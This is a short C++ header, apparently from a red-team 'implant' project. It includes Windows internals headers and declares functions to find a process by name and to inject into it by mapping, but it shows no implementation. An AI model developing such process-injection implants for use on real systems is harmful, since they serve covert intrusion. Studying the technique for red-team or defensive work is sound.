#pragma once

// RTO Implant.h and RTO Implant.cpp are the table of contents for this project
// On my second iteration of redesign. Will probably go through again at somepoint
// and try to make this less garbo

#define VC_EXTRALEAN
#define WIN32_LEAN_AND_MEAN

#include <combaseapi.h>
#include "resource.h"
#include <windows.h>
#include <winnt.h>
#include <winternl.h>

#pragma comment(lib, "ntdll")

DWORD FindProcess(LPCWSTR processName);
BOOL CreateMapInject(DWORD pid);
